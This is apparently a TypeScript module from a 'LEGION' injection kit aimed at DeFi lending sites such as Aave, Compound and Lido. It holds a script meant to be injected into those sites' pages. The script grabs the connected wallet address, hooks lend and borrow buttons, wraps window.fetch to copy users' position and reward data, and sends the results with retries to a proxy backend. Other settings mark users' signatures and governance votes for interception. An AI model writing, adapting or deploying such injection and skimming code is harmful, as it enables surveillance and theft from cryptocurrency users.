/**
 * LENDING EXTRACTION TEMPLATE
 *
 * Targets: Aave, Compound, Yearn, Maker, Convex, Lido, Rocket Pool, Frax
 *
 * Extracts:
 * - Lending positions and collateral
 * - Borrowing positions and debt
 * - Yield farming APY
 * - Pool liquidity
 * - Governance votes
 */

import { BaseExtractionTemplate, ExtractionTemplate } from '../extraction-templates.js'

export class LendingTemplate extends BaseExtractionTemplate implements ExtractionTemplate {
  name = 'Lending Extraction Template'
  category: 'lending' = 'lending'
  platforms = ['app.aave.com', 'compound.finance', 'yearn.finance', 'makerdao.com', 'convexfinance.com', 'lido.fi', 'rocketpool.net', 'frax.finance']
  supportedChains = ['ethereum', 'polygon', 'arbitrum', 'avalanche', 'optimism', 'bsc', 'fantom']
  injectionPoints = ['borrow', 'lend', 'dashboard', 'portfolio', 'governance', 'stake']

  extractionTargets = [
    {
      name: 'lending_position',
      type: 'liquidity' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'collateral_amount',
      type: 'balance' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'lending_apy',
      type: 'price' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'borrowing_position',
      type: 'transaction' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'borrowed_amount',
      type: 'balance' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'borrowing_apy',
      type: 'price' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'health_factor',
      type: 'credential' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'farm_yield',
      type: 'price' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'staking_reward',
      type: 'price' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'parse' as const,
    },
    {
      name: 'governance_vote',
      type: 'signature' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'lending_signature',
      type: 'signature' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'pool_tvl',
      type: 'liquidity' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
  ]

  walletDetection = {
    detection: {
      metamask: true,
      phantom: false,
      ledger: true,
      trezor: false,
      trustwallet: true,
      coinbase: true,
      walletconnect: true,
    },
    signatureMethod: 'eth_signTypedData_v4' as const,
    permissionRequest: ['eth_accounts', 'eth_signTypedData_v4', 'eth_sendTransaction'],
  }

  apiEndpoints = [
    {
      name: 'user_positions',
      method: 'GET' as const,
      path: '/api/user/positions',
      interceptionType: 'response' as const,
      dataToExtract: ['lending', 'borrowing', 'collateral'],
    },
    {
      name: 'pool_data',
      method: 'GET' as const,
      path: '/api/pools',
      interceptionType: 'response' as const,
      dataToExtract: ['apy', 'tvl', 'utilization'],
    },
    {
      name: 'farm_rewards',
      method: 'GET' as const,
      path: '/api/rewards',
      interceptionType: 'response' as const,
      dataToExtract: ['rewards', 'apy', 'balance'],
    },
  ]

  scriptContent = `
(function() {
  const LEGION_LENDING = {
    platform: 'lending',
    initialized: false,
    extractedData: {},

    async initialize() {
      console.log('[LEGION] Lending Template Initialized');
      await this.detectWallet();
      this.hookLendingOperations();
      this.interceptLendingAPICalls();
      this.initialized = true;
    },

    async detectWallet() {
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts?.length) this.extractedData.wallet_address = accounts[0];
        } catch (e) {}
      }
    },

    hookLendingOperations() {
      const observer = new MutationObserver(() => {
        // Find buttons by text content (fix for :contains pseudo-selector)
        const buttons = document.querySelectorAll('button');
        for (const btn of buttons) {
          const text = btn.textContent?.toLowerCase() || '';

          // Lend/Supply button
          if ((text.includes('lend') || text.includes('supply')) && !btn.hasAttribute('data-legion-hooked-lend')) {
            btn.setAttribute('data-legion-hooked-lend', 'true');
            btn.addEventListener('click', () => {
              console.log('[LEGION] Lending triggered');
              this.extractedData.action = 'lend';
              setTimeout(() => this.sendToBackend(), 2000);
            });
          }

          // Borrow button
          if (text.includes('borrow') && !btn.hasAttribute('data-legion-hooked-borrow')) {
            btn.setAttribute('data-legion-hooked-borrow', 'true');
            btn.addEventListener('click', () => {
              console.log('[LEGION] Borrowing triggered');
              this.extractedData.action = 'borrow';
              setTimeout(() => this.sendToBackend(), 2000);
            });
          }
        }
      });
      observer.observe(document.body, { childList: true, subtree: true });
    },

    interceptLendingAPICalls() {
      const originalFetch = window.fetch;
      window.fetch = function(...args) {
        const url = typeof args[0] === 'string' ? args[0] : args[0].url;
        if (url.includes('/api/')) {
          originalFetch
            .apply(this, args)
            .then((r) => {
              // Clone response for reading JSON without consuming original
              const responseClone = r.clone();
              return responseClone.json().then((d) => {
                if (url.includes('positions')) LEGION_LENDING.extractedData.positions = d;
                if (url.includes('pools')) LEGION_LENDING.extractedData.pools = d;
                if (url.includes('rewards')) LEGION_LENDING.extractedData.rewards = d;
                console.log('[LEGION] Lending API intercepted:', url);
              });
            })
            .catch((error) => {
              // Log errors without crashing
              console.warn('[LEGION] Lending API parse error for', url, ':', error);
            });
        }
        return originalFetch.apply(this, args);
      };
    },

    async sendToBackend() {
      try {
        const response = await fetch('/__legion_proxy/api/v1/lending-extraction', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ platform: 'lending', data: this.extractedData, timestamp: new Date() }),
        })
        if (!response.ok) {
          console.warn('[LEGION] Lending backend returned non-OK status:', response.status)
        }
      } catch (error) {
        // Log error but don't throw (backend communication is best-effort)
        console.error('[LEGION] Failed to send lending extraction to backend:', error)
        // Attempt retry after delay
        setTimeout(() => this.sendToBackend(), 5000)
      }
    },
  };
  window.__LEGION_EXTRACTION__ = LEGION_LENDING;
})();
  `.trim()
}

export const lendingTemplateInstance = new LendingTemplate()
